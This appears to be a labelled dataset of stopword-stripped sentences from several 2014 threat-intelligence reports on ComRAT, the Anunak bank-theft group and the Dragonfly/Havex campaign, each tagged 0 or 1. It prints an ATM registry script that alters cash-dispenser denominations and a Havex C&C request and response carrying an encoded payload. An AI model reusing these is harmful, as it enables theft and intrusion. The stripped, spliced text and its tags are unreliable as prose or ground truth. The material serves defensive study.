The second wave attacks occurred 25 December 2014 Xbox PlayStation online platforms suffered outages LizardSquad claimed responsibility	0
CrowdStrike Intelligence also aware DDOS threats gaming platforms including Valve Software appeared targeted DNS amplification DDOS attack similar previous LizardSquad activity	0
Malicious actors already engaged disruptive campaigns early 2015	0
Following January terrorist attacks France group Islamist hackers known Fallaga conducted DDOS attacks servers hosting websites French foreign embassies	0
Soon another Islamist group identifying ISIS took control Twitter YouTube accounts U.S.	0
Central Command posted number messages threatening U.S.	0
troops families	0
Organizations sectors aware prepared destructive disruptive attacks	0
These operations often motivated specific grievance sometimes clear motivation established	0
Continuous monitoring publicized threats organization potential areas controversy could motivate malicious activity vital detect prepare types attacks	0
The question How incorporate intelligence daily defenses prioritize resources based risk business ? Conclusion In course reviewing 2014 many interesting events adversaries innovations selecting examples report incredible challenge	0
The CrowdStrike Intelligence team spent much time narrowing scope topics covered herein	0
The adversaries 2014 proved nothing else dynamic persistent innovative	0
Defenders must inventive diligent decisive efforts defend enterprise attackers	0
2015 continuation cat - - mouse game played adversary defender	0
Adversaries across motivational spectrum continue evolve tactics order achieve objectives	0
Although tactics may evolve network defenders able success adversary long well prepared	0
Intelligence provide decisive advantage sides good defense predicated informed intelligent defensive team	0
The incorporation intelligence daily defense enterprise continue paramount products services solution providers need use intelligence stay ahead adversary	0
At CrowdStrike intelligence powers everything 2015 unfolds organizations using intelligence better prepared detect deter defend adversaries	0
Crowdstrike Falcon Intelligence CrowdStrike Falcon Intelligence portal provides enterprises strategic customized actionable intelligence	0
Falcon Intelligence enables organizations prioritize resources determining targeted versus commodity attacks saving time focusing resources critical threats	0
With unprecedented insight adversary Tactics Techniques Procedures ( TTPs ) multi - source information channels analysts identify pending attacks automatically feed threat intelligence via API SIEM third - party security tools	0
Access CrowdStrike Falcon Intelligence geared toward levels organization executive needs understand business threat strategic business impact front- line security professional struggling fight adversary 's attack enterprise	0
CrowdStrike Falcon Intelligence web - based intelligence subscription includes full access variety feature sets including	0
Let us show CrowdStrike help understand adversary better protect network 2015 Contact sales@crowdstrike.com discuss specific needs	0
888 - 512 - 8906 www.crowdstrike.com two thousand fourteen CrowdStrike Global Threat Intel Report About CrowdStrike CrowdStrike™ leading provider next- generation endpoint protection threat intelligence services	0
CrowdStrike Falcon enables customers prevent damage targeted attacks detect attribute advanced malware adversary activity real time effortlessly search endpoints reducing overall incident response time	0
CrowdStrike customers include largest blue chip companies financial services energy oil & gas telecommunications retail technology sectors along largest sophisticated government agencies worldwide	0
To learn please visit www.crowdstrike.com	0
In November 2014 experts G DATA SecurityLabs published article ComRAT Agent BTZ successor	0
We explained case linked Uroburos rootkit	0
We assume actor behind campaigns uses several different malware strains order compromise targeted infrastructure Uroburos rootkit ; Agent BTZ / ComRAT remote administration tools Linux malware maybe even	0
We decided even closer look Agent BTZ ComRAT therefore analyzed evolution RAT covering seven years development	0
Here table minimal information 46 different samples	0
Thanks versioning deduce compilation dates saw currently see actually seem legit – except last known version author modified compilation date order make analysis complex	0
We see malware really active 2007 2008	0
New versions declined frequency 2009 one new sample identified 2010	0
We encounter new sample 2011 malware appeared back 2012 new major version	0
To describe evolution development decided compare ten major versions	0
The following chapter present main differences versions mentioned	0
Here resemblance ratio version comparing direct neighbor versions created using BinDiff	0
The biggest code update occurred version 2.14.1 version 3.00	0
The gap matches absence samples two years fundamental modification call death Agent BTZ birth ComRAT	0
Differences version Ch 1.0 ( 2007 - 06 ) Ch 1.5 ( 2008 - 03 ) The analyzed samples	0
We identify strong modification two samples	0
However notice following	0
Differences version Ch 1.5 ( 2008 - 03 ) Ch 2.03 ( 2008 - 05 ) The analyzed samples	0
In version 2.03 Agent BTZ authors changed following	0
They added obfuscation order hide sensitive strings ; The communication protocol modified order include flag " CHCMD " assume " CH " meaning " Ch " version number " CMD " abbreviation command ; From malware supports " runas " order execute commands administrator	1
This command implemented Microsoft Windows Vista 2007	0
We assume author implemented feature several targets switched version Windows 2008	0
According article version 1.5 used US Pentagon	0
We assume string obfuscation performed order bypass security measures capable detecting intrusion	0
Differences version Ch 2.03 ( 2008 - 05 ) Ch 2.11 ( 2009 - 09 ) The analyzed samples	0
The codes two versions extremely similar notice small changes	0
Differences version Ch 2.11 ( 2009 - 09 ) Ch 2.14.1 ( 2010 - 02 ) The analyzed samples	0
These codes really similar	0
We notice two changes	0
The four exported libraries show malware started support OLE Component Object Model ( COM )	0
This version first version able registered COM object	0
Three four functions empty	0
The fourth one executes malware	0
Differences version 2.14.1 ( 2010 - 02 ) Ch 3.00 ( 2012 - 01 ) The analyzed samples	0
These codes really differ even parts version 2.14.1 retained	0
Moreover developers changed compiler ; switched Visual Studio 6.0 Visual Studio 9.0/10.0 strong indicator huge differences Version 3.00 G DATA SecurityLabs experts call ComRAT	0
We say version 2.14.1 last version Agent BTZ	0
Here main differences Agent BTZ ComRAT	0
On several 3.00 samples author forgot remove compilation path examples	0
Thanks compilation paths assume original name RAT " Chinch " leads us assumption " CH " characters version name flag " CHCMD " stands " Chinch "	0
In English chinch word small North American bug Blissus leucopterus	0
This word derived Spanish word chinche meaning pest	0
Differences version 3.00 ( 2012 - 01 ) Ch 3.10 ( 2012 - 12 ) The analyzed samples	0
The codes similar authors added several features	0
The last new feature really interesting compromised targets block specific command control server malware continue work thanks two alternative command control servers	0
Differences version 3.10 ( 2012 - 12 ) Ch 3.20 ( 2013 - 06 ) The analyzed samples	0
The major new feature version new exports function called InstallW ( )	0
This exported function used dropper add persistence registry drop second file ( explained previous article )	1
Version 3.20 uses following CLSID order hijack COM object B196B286-BAB4- 101A - B69C-00AA00341D07	0
This object IConnectionPoint interface	0
The CLSID used version	0
We assume performed COM object hijacking generates trouble infected system 's author changed related things next version	0
Furthermore CLSID stored plain text within sample	0
Differences version Ch 3.20 ( 2013 - 06 ) Ch 3.25 ( 2014 - 02 ) The analyzed samples	0
In 3.25 version author switched CLSID 42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1 described article	0
Furthermore strings sample obfuscated	0
The main new feature obfuscation – almost strings obfuscated XML pattern written plain text anymore	0
Differences version Ch 3.25 ( 2014 - 02 ) Ch 3.26 ( 2013 - 01 ; date modified ) The analyzed samples	0
The version 3.26 latest known version	0
In version	0
This analysis shows us seven years evolution Remote Administration Tool used group targeted extremely sensitive entities US Pentagon 2008 Belgium Ministry Foreign Affairs 2014 well Finnish Ministry Foreign Affairs	0
Except version 3.00 modifications made rather marginal	0
We see authors adapted features Windows versions patched bugs added obfuscation etc … The biggest update performed version 3.00 two years silence	0
Visibly RAT used alongside Uroburos rootkit	0
Nevertheless entirely clear attackers choose use RAT rootkit whether used parallel	0
Taking everything consideration G DATA SecurityLabs experts sure group behind Uroburos / Agent BTZ / ComRAT / Linux tool/ … remain active player malware APT field	0
The newest revelations made connections drawn let us believe even come	0
Hereby Group - IB Fox - IT inform This report describes details type op- erations carried organized criminal group focuses financial industry banks payment providers retail industry news media PR companies	0
The group origin common financial fraud including theft con- sumer corporate bank accounts Europe Russia using standard banking malware mainly Carberp	0
After arrests Carberp group members Russia members work however experience gained many years crime allowed enter new niche	0
One members quickly realized steal $ 2000 thousand times earn $ 2 million also steal one time immediately get much less effort	0
The anti - fraud measures employed banks pushed criminals search new ways make money less bar- riers compromising modifying taking data banks payment providers retail media/ PR companies methods	0
From 2013 organized criminal group intensi- fied activity focused banks electronic pay- ment systems Russia post - Soviet space	0
The key fraud occurs within corporate network using internal payment gateways in- ternal banking systems	0
Thus money stolen banks payment systems customers	0
While main lucra- tive activity gang also ventured areas including compromise media groups organizations industrial espionage likely trading advantage stock market	0
In cases group got access government agency networks aim espionage related	0
The organized criminal group backbone citizens Russian Ukrainian origin group also sources number mainstream specialized services individuals groups originating Russia Ukraine Belarus	0
The average sum theft Russian terri- tory post - Soviet space $ 2 million per incident	0
Since 2013 successfully gained access networks 50 Russian banks 5 payment systems 2 institutions deprived banking license	0
To date total amount theft 1 billion rubles ( 25 million dollars ) stolen second half 2014	0
The average time moment penetration financial institutions internal network till successful theft 42 days	0
As result access internal bank networks attackers also managed gain access ATM management infrastructure infect sys- tems malicious software allows theft banks ATM systems attackers command	0
Since 2014 organized criminal group mem- bers began actively taking interest US Eu- ropean based retail organizations	0
While already familiar POS malware compromis- ing POS terminals widespread media attention around Target breach related breaches reason move	0
While scale breaches industry still relatively low least 3 successful card breaches dozen retailers compromised activity quickly becom- ing lucrative endeavor group	0
To penetrate internal networks organized criminal group employs targeted emailing ( spear phishing ) infections sources botnets	0
This main reason group keeping touch owners large botnets	0
Since August 2014 group began create large botnet using mass emailing using typical exploit driveby infections	0
This last move likely reduce need external contacts	0
The first successful bank robbery committed group January 2013	0
In first cases attackers used program RDPdoor remote access bank network program " MBR Eraser " remove traces crack Windows computers servers	1
Both programs used members Carberp criminal group guidance person named Germes	0
To reduce risk losing access internal bank network attackers addition malicious programs also used remote access legitimate pro- grams Ammy Admin Team Viewer	0
Lat- er attackers completely abandoned usage RDPdoor Team Viewer	0
In addition banking payment systems hackers got access e - mail servers control internal communications	1
This approach allowed find anomalous activity bank network identified technique used identify activity measures bank employees took solve problem	0
Email control successfully installed regardless used email system MS Exchange Lotus	0
This approach allowed take countermeasures created bank payment system employees feeling problem solved	0
The main steps attack progression following ones To carry target attacks 2014 hackers finalized development core malware Anunak used along following tools	0
According laboratory classification main malware " Anunak "	0
This trojan used target attacks mainly banks payment systems	0
Target usage program allows remain poorly explored providing good surviv- ability inside corporate networks	0
The source code bank trojan program Carberp used places malware	0
" Anunak " following feature set	0
There ability download arbitrary exe- cutable files management server run	1
One files program " AmmyAd- min " may run arguments " -service " " -nogui " force start service without user interface	0
" AmmyAdmin " allows connect another computer software server " rl.ammyy.com " using IP address unique identifier	0
As result attacker gets remote access user computer running program " AmmyAdmin " bypassing firewalls	1
The window screenshot shown figure	0
When attackers gain access servers running operating systems Linux family use SSH backdoor transmits malicious server login / password data used access servers provides attackers remote access servers	1
To provide access server interest at- tackers may appropriately modify rules firewalls Microsoft TMG CISCO etc	1
When attackers yet major malware would secretly install program " AmmyAd- min " report attackers remote access password used malicious program known " Barus "	0
This malware used rarely last time met 2013	0
This malicious program developed Russian - speaking authors	0
In control panel notice field " Ammy ID " usage allowed attackers connect remotely	0
At beginning activity 2013 due lack target Trojan attackers began distribute Andromeda Pony	0
They distributed malware using Driveby bunch Neutrino Exploit Kit exploits shown figure	0
It interesting autumn 2013 used site http://php.net/ traffic source Magnitude EK	0
They redirected traffic resource since July 2013 fact discov- ered much later	0
The name one streams distribute malware " LOL BANK FUCKIUNG " corresponded attacker activities	0
Parallel technique also use another infection method one principal methods	0
The main method distribution send- ing emails malicious attachments behalf Central Bank Russian Federation poten- tial client real counterparty ( first attack- ers cracked counterparty account used emailing cracked contact list )	0
Another used method install special malware carry targeted attacks via another malware might appear local network accident	0
To find malicious programs criminal group keeps touch several owners large botnets massively distributes mal- ware	0
The attackers buy botnet owners information IP - addresses computers botnet owners installed malware check whether IP - address belongs financial government institutions	0
If mal- ware subnet interest attackers pay large botnet owner installation target malware	0
Such partner relations established owners botnets Zeus Shiz Ranbyus	0
All trojans bank Trojans usage ex- plained previously established relationships	0
In late 2013 hacker alias Dinhold be- gan build botnet using modified Carberp uploaded source code public access	0
The attackers trying create similar relations hacker 2014 arrested developed botnet required level	0
To check whether IP - address belongs desired network following script used	0
The dangerous emailings sent behalf partners financial government institutions communicates permanently email	0
An example emailing occurred Septem- ber 25 2014 14:11 e - mail address " Elina Shchekina e.shekina@rbkmoney.com " subject " Updated agree- ment version "	0
The attachment " agreement.doc " exploits vul- nerability CVE-2012 - 2539 CVE-2012 - 0158	0
The emailing conducted 70 addresses various compa- nies ( multiple recipient addresses may within one company )	0
The letter malicious attachment ( md5 AA36BA9F- 4DE5892F1DD427B7B2100B06 ) archive password potential client sent bank manager pre- liminary telephone conversation	0
The call origin Saint Petersburg	0
Contents text file named " реквизиты.doc " ( partner de- tais.doc ) " Company Our Century " Ltd.	0
109387 Russia Moscow Anosov str 24 office 409 Tel	0
( 495 ) 124 - 99 - 77 Fax ( 495)124 - 99 - 77 Mobile ( 962 ) 7135296 E - mail x60x@nxt	0
ru INN 7329001307 KPP 732901001 Account 40702810613310001709 Branch VTB 24 ( JSC ) Moscow Correspondent account 30101810700000000955 BIC 043602955 A letter behalf Central Bank Russia malicious attachment ( md5 8FA296EFAF87FF4D- 9179283D42372C52 ) exploited vulnerability CVE-2012- 2539 order execute arbi- trary code	0
There also exam- ples emails malicious attachments emailing file " 001	0
photo.exe "	0
A detailed list attachments see Table " Email attachments "	0
Availability access bank internal networks opens great opportunities hackers	0
One opportunities access ATMs spe- cial network segments isolated	0
It confirmed criminal group gained access 52 ATMs	0
The amount damage exceeds 50 million rubles	0
As result access ATMs depending ATM model hackers used different patterns	0
Having access attackers downloaded mali- cious scripts changed denominations issued banknotes ATM operating system registry	1
As result query get 10 notes denomination 100 roubles attackers received 10 banknotes denomination 5,000 roubles	0
The used malicious script program developed platform Wincor	0
The malicious script contains following commands	0
Contents file " 1.bat " REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_1 /t REG_SZ /d " 5000 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_2 /t REG_SZ /d " 1000 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_3 /t REG_SZ /d " 500 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_4 /t REG_SZ /d " 100 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_1 /t REG_SZ /d " 100 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_4 /t REG_SZ /d " 5000 " /f shutdown -r -t 0 –f Execution file changed registry keys registry branch " " HKEY_LOCAL_MACHINE\ SOFTWARE\Wincor Nixdorf\ProTopas\Current- Version\LYNXPAR\CASH_DISPENSER " " responsible cassette denominations ATM	1
As result file execution registry key charge cassette number 1 ( VALUE_1 ) takes value " 100 " registry key respon- sible cassette number 4 ( VALUE_4 ) set " 5000 "	0
Then command restart computer issued	0
The registry key reference values If ATM actual load corresponds refer- ence one registry keys changed banknotes cassette No.1 issued denomination " 5000 " instead " 100 "	0
In addition attackers used modified debug program allows command issue mon- ey dispenser	0
The original debug program issues money dispenser open ATM housing vault door fixed	0
In order ensure money issuance closed ATM attackers modify original program " KDIAG32 " ( original file size 1,128,960 MD5 4CC1A6E049942EB- DA395244C74179EFF )	0
A comparison original version pro- gram modified version showed difference ignoring error " " Door opened missing " "	0
The figure shows error message never displayed user file investigation	0
All traces found investigation one incident showed criminal group worked	0
Ammy Admin used remote access SSHD backdoor installed Unix servers In addi- tion loaded hacked server cases trojan Anunak usage	0
However case Androm- eda used main trojan instead Anunak	0
The man- agement servers located Kazakhstan Germany Ukraine	0
Check manage- ment servers showed hosting Bulletproof addition servers provides service traffic proxying infrastructure well TOR VPN usage pattern significantly differs Anunak host- ing patern	0
Check money cashout showed cashout criminal group worked Anunak fact confirmed cooperation	0
Obtained Andromeda trojan copies distributed August 2014 e - mail	0
The value 754037e7be8f61cbb1b85ab46c7da77d MD5 hash string " go fuck " used RC4 encryption key	0
As result distri- bution August late October Andromeda botnet rose 260,000 bots	0
Successful infection one subnet resulted sending letters bank employees	0
Example forwarding infected bank network employees another bank shown	0
As result radial mailing many oil gas companies banks government agencies in- fected	0
In Russia least 15 banks two payment systems infected way	0
Letters similar attachments dis- tributed following subjects " My new photo " " Alert Transactions Report users 2014- 09 - 28 2014 - 09 - 28 " Previously noted fact process stolen money withdrawal ( cashout ) differed firstly theft method secondly victim type ( bank payment system ) thirdly total stolen sum	0
The victims type divided rather counterparty types limitations imposed operation counterparties	0
For example payments required go certain pool mediators	0
In addition " improper " pool counterparties could cause suspicion unneces- sary testing ( manual processing payment orders )	0
Bank ( amounts 100 million roubles )	0
While attacks Russia banks payment systems occurred past two years attacks retail industry something started second quarter 2014	0
With least three confirmed breaches card track data obtainedand total least 16 breaches retail organizations also becoming serious threat	0
Apart retail organizations also known number media PR companies breached 2014	0
While entirely cer- tain type breaches suggest attackers looking inside information type indus- trial espionage allowing gain advantage stock market	0
As nothing specifically missing resulting fraud hard match anything incidents typically never linked	0
From retail perspective first infections 2014 sourced botnet employs widely deployed crypto - currency mining malware based Gozi / ISFB ( banking ) malware family	0
Based insights believe first half 2014 half million systems compromised malware whole world however Russia number post - Soviet states clean infections	0
To find interesting infections within large set compromised systems malware extracts relevant information systems including Microsoft Windows organization registration information network/ Windows domain information	0
The Gozi / ISFB based malware used drop additional components interesting systems included Metasploit / Meterpreter payloads Anunak variants	1
This one main methods group using Anunak obtain in- teresting infections middle 2014 sourcing infections botnet operators More recent- ly infection methods including spear phishing using English language possibly also usage teams Andromeda also SQL injection breach organization directly outside employed team	0
The first known attacks Anunak targeted specific brand POS systems revolved around Epicor / NSB brand	0
To Anunak specific code target POS devices equipped software contrary common memory scanning track data scrapers logs wealth information payments done cards	0
The first case seen active July 2014 might earlier well	0
More recent breaches used new custom developed POS malware simple reliable track data memory scraper	0
The initial version early fall 2014 used simple blacklist scraped every process dumped track data plain text	0
More recent versions scanned configuration specified processes used RC4 encrypt extracted track data records disk	0
While retail industry one main targets due payment processing capabilities compromises might occur indirectly example obtain databases information informa- tion value organized criminal group	0
One possibilities obtaining lists corporate email addresses higher chance interest- ing infections	0
At moment evidence successful compromise theft banks payment systems outside Russia several infections east Europe ( specifically Ukraine Latvia ) active 2014	0
These specific infections related infrastructure organizations based Russia significant interests Russia thus likely related breaches organization Russia	0
The majority infections Europe dedicated servers used exit node VPN services systems infected likely Eastern Euro- pean Russian origin possibly test infections attackers	0
We evidence compro- mises banks Western Europe United States noted attackers methods could utilized banks outside Russia well	0
The group uses Metasploit one main hacking tools either stand alone part framework	0
The activity includes port scanning system reconnaissance escalating privileges systems using example recent CVE-2014- 4113 vulnerability gathering credentials hop- ping systems networks	0
Metasploit used full potential scanning exploiting privilege escalation post exploitation persistence achieved standard toolset	0
On interesting critical systems typical hack- ing tools might found establish tunnels network either tools part Metasploit framework Meterpreter also tools achieve persistence systems	0
The connect back methods seen typically SSL port 443 also DNS based methods observed	0
The attackers use BITS download files also make use Windows built - PowerShell download tools execute commands	0
Finally critical systems freshly crypted non - detected versions Anunak deployed typically used limited deployments thus spread limited detection Anti - Virus rare	0
Various stealth methods including aforemen- tioned backconnect SSL DNS tunneling compromise persistence data exfiltration used	0
The Anunak malware multiple ways connecting backends includes PHP based backend reachable HTTP HTTPS Windows server based component using propri- etary protocol	0
The use VNC scanning password brute forcing adding additional administrator accounts use RDP Wrapper allow concurrent RDP sessions methods gain access achieve persistent access compromised systems employed group	0
Additionally various ways creating incidental regular screen captures desktop persons interest within com- promised organizations methods employed attackers	0
This also includes video captures made Anunak malware allowing attackers observe behavior users certain applications	0
Group - IB one leading international companies specializing preventing investigat- ing high - tech cyber crimes fraud	0
The company offers range services preventing financial reputational damages consulting auditing information security systems computer forensics	0
The company also develops number innovative software products used monitor detect prevent emerging cyber threats	0
The Group - IB team made experts unique skills solid practical experience	0
They internationally certified CISSP CISA CISM CEH CWSP GCFA also information security state certificates	0
In 2013 computer secu- rity incident response team CERT - GIB operated Group - IB became member FIRST - Forum Incident Response Security Teams	0
In 2013 company became member international cyber security alliance IMPACT ( In- ternational Multilateral Partnership Against Cyber Threats )	0
www.group-ib.com Fox - IT creates innovative cyber security solutions secure society	0
We dedicated clients values integrity	0
Fox - IT delivers solutions attacks	0
InTELL real - time cyber intelligence product Fox - IT	0
It provides layered intelligence approach actionable data feeds operational risk decision systems	0
Real time threat information allows tactical decisions mitigation	0
InTELL provides full real - time insight global threat landscape	0
We base intelligence around actor attribu- tion	0
This angle drives unique visibility online threats - InTELL sees threats enter botnet	0
Information delivered col- laboration portal alerting automated feeds powered industry standard transports	0
www.fox-it.com	0
A cyberespionage campaign range targets mainly energy sector gave attackers ability mount sabotage operations victims	0
The attackers known Symantec Dragonfly managed compromise number strategically important organizations spying purposes used sabotage capabilities open could caused damage disruption energy supply affected countries	0
The Dragonfly group also known vendors Energetic Bear capable group evolving time targeting primarily energy sector related industries	0
They operation since least 2011 may active even longer	0
Dragonfly initially targeted defense aviation companies US Canada shifting focus US European energy firms early 2013	0
More recent targets included companies related industrial control systems	0
Dragonfly used spam email campaigns watering hole attacks infect targeted organizations	0
The group used two main malware tools Trojan Karagany Backdoor Oldrea	0
The latter appears custom piece malware either written attackers	0
Symantec observed spear phishing attempts form emails PDF attachments February 2013 June 2013	0
The email topics related office administration issues dealing account problems delivery	0
Identified targets campaign mainly US UK organizations within energy sector	0
In May 2013 attackers began use Lightsout exploit kit attack vector redirecting targets various websites	0
The use Lightsout exploit kit continued date albeit intermittently	0
The exploit kit upgraded time obfuscation techniques	0
The updated version Lightsout became known Hello exploit kit	0
A newer approach used attackers involves compromising update site several industrial control system ( ICS ) software producers	1
They bundle Backdoor Oldrea legitimate update affected software	1
To date three ICS software producers known compromised	0
The Dragonfly attackers used hacked websites host command - - control ( C&C ) software	1
Compromised websites appear consistently use form content management system	0
The current targets Dragonfly group based compromised websites hijacked software updates energy sector industrial control systems particularly based Europe	0
While majority victims located US appear mostly collateral damage	0
That many computers likely infected either watering hole attacks update hijacks interest attacker	0
By examining victims active infections – additional malicious activity detected – possible gather accurate picture ' true ' victims	0
The active infections Figure 2 Spain followed order US France Italy Germany	0
Dragonfly uses two main pieces malware attacks	0
Both Remote Access Tool ( RAT ) type malware provide attackers access control compromised computers	1
Dragonfly 's favored malware tool Backdoor Oldrea also known Havex Energetic Bear RAT	0
Oldrea acts back door attackers victim 's computer allowing extract data install malware	1
Oldrea appears custom malware either written group created	0
This provides indication capabilities resources behind Dragonfly group	0
The second main tool used Dragonfly Trojan Karagany	0
Unlike Oldrea Karagany available underground market	0
The source code version 1 Karagany leaked 2010	0
Symantec believes Dragonfly may taken source code modified use	0
Symantec found majority computers compromised attackers infected Oldrea	0
Karagany used around 5 percent infections	0
The two pieces malware similar functionality prompts attackers choose one tool another remains unknown	0
The Dragonfly group used least three infection tactics targets energy sector	0
The earliest method email spear phishing campaign saw selected executives senior employees target companies receive emails containing malicious PDF attachment	1
Infected emails one two subject lines " The account " " Settlement delivery problem "	0
All emails single Gmail address	0
Figure 3 displays number different recipients per day	0
The spam campaign began February 2013 continued June 2013	0
Symantec identified seven different organizations targeted campaign	0
At least one organization attacked intermittently period 84 days	0
In June 2013 attackers shifted focus watering hole attacks	0
They compromised number energy- related websites injected iframe	0
This iframe redirected visitors another compromised legitimate website hosting Lightsout exploit kit	0
This turn exploited either Java Internet Explorer order drop Oldrea Karagany victim 's computer	1
The fact attackers compromised multiple legitimate websites stage operation evidence group strong technical capabilities	0
In September 2013 Dragonfly began using new version exploit kit known Hello exploit kit	0
The landing page kit contains JavaScript fingerprints system identifying installed browser plugins	0
The victim redirected URL turn determines best exploit use based information collected	0
Figure 4 shows compromised websites categorized respective industries	0
Fifty percent identified targets energy industry related thirty percent energy control systems shown Figure 4	0
A clear shift attackers targeting seen March 2014 energy control systems become primary target	0
The ambitious attack vector used Dragonfly compromise number legitimate software packages	0
Three different ICS equipment providers targeted malware inserted software bundles made available download websites	0
Analysis compilation timestamps malware used attackers indicate group mostly worked Monday Friday activity mainly concentrated nine - hour period corresponded 9 6 pm working day UTC + 4 time zone	0
The Dragonfly group technically adept able think strategically	0
Given size targets group found " soft underbelly " compromising suppliers invariably smaller less protected companies	0
Identification group based use two malware families exploit kit	0
The malware families utilized Backdoor Oldrea Trojan Karagany	0
The exploit kit known Lightsout and/or Hello	0
Hello updated iteration Lightsout Dragonfly group began use September 2013	0
Use Backdoor Oldrea appears limited Dragonfly group	0
In addition specific instances Trojan	0
Karagany used group	0
Karagany Russian RAT sold underground forums	0
Instances malware related Dragonfly group identified based delivered Lightsout exploit kit also particular packer group used	0
Symantec detects Trojan Karagany packer used group Trojan Karagany!gen1	0
The Lightsout exploit kit simple exploit kit consistently used deliver primarily Backdoor Oldrea several instances Trojan Karagany	0
A number sites use content management systems exploited iframe used order redirect visitors sites hosting Lightsout exploit kit	0
An example injected iframe seen figure 7	0
The exploit kit uses browser ( e.g.	0
Internet Explorer Firefox ) Java exploits order deliver either Backdoor Oldrea Trojan Karagany	0
An example structure Lightsout exploit kit seen Table 1	0
Note file names exploits used may vary	0
In September 2013 Dragonfly group began using new version Lightsout also known Hello exploit kit	0
The JavaScript included landing page redirects browser URL depends fonts installed system browser add - ons OS version user agent	0
At point determines best exploit use based information provided generates appropriate URL redirect user appropriate exploit / payload	0
The following shows example request [ http://]compromised.example / wp - includes / pomo/ dtsrc.php?a=[EK _ DETERMINED _ PARAMETER ] [ EK_DETERMINED_PARAMETER ] may anything listed Table 2	0
The parameters dwe dwd relate payload requested download example The values [ EK_DETERMINED_PARAMETER ] variable may relate two different file types represented Backdoor Oldrea Trojan	0
Karagany!gen1 payloads	0
Oldrea payloads DLL files ( URLs end " " DLL ? ) Karagany!gen1 payloads portable executables ( URLs end " e " EXE ? )	0
At core Backdoor Oldrea persistent component interacts C&C servers download execute payloads	1
The components downloaded reaching C&C server performing GET request returns HTML page containing base64 encoded string two comments marked ' havex ' string	1
In specific example ' 038 ' file name indicates major version number	0
Post infection Backdoor Oldrea attempt collect system information OS user name computer name country language nation Internet adapter configuration information available drives default browser running processes desktop file list My Documents Internet history program files root available drives	1
It also collects data Outlook ( address book ) ICS related software configuration files	0
This data collected written temporary file encrypted form POST'ed remote C&C server	1
The following examples POST request POST response	0
POST request example POST /wp08/wp - includes / dtcla.php?id=285745296322896178920098FD80 - 20&v1=038&v2=17 0393861&q=5265882854508EFCF958F979E4 HTTP/1.1 User - Agent Mozilla/5.0 ( Windows ; U ; Windows NT 6.1 ; en - US ) AppleWebKit/525.19 ( KHTML like Gecko ) Chrome/1.0.154.36 Safari/525.19 Host toons.freesexycomics.com Content - Length 0 Cache - Control - cache POST response example HTTP/1.1 200 OK Date We 22 Jan 2014 13:40:48 GMT Content - Type text / html Transfer - Encoding chunked Connection keep - alive Server Apache/1.3.37 ( Unix ) Cache - Control - cache 9f65 html><head><mega http - equiv='CACHE - CONTROL ' content='NO - CACHE'></ head><body No data!<!--havexQlpoOTFBWSZTWWYvDI0BOsD//////////////////////////////////// /////////4oB+93VVXu69DuN7XYzds9yt49Ques [ ... TRUNCATED FOR READABILITY ] + yUW3zfTxWAOstsCwCckdW5 AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eD M92D/8XckU4UJBmLwyNA==havex--></body></head Various samples process C&C responses differently	0
In one example sample searches data enclosed tag ' havex '	0
Once data found decoded using standard base64 + bzip2 also xor layer bytes string 1312312	0
The decoded data contains small header followed executable MZ - file	0
Another sample found use standard base64 + reverse xor + RSA-2048 decrypting received data	0
The decrypted data consists 6 byte command concatenated MZ file	0
The MZ file compressed lzma algorithm	0
RSA keys decryption together initial configuration information stored registry base64 form	0
This section includes information identified payloads downloaded Backdoor Oldrea	0
The following brief description functionality identified component	0
Trojan Karagany back door used primarily recon	0
It designed download install additional files exfiltrate data	1
Samples sometimes use common binary packers UPX Aspack top custom Delphi binary packer / protector payload	0
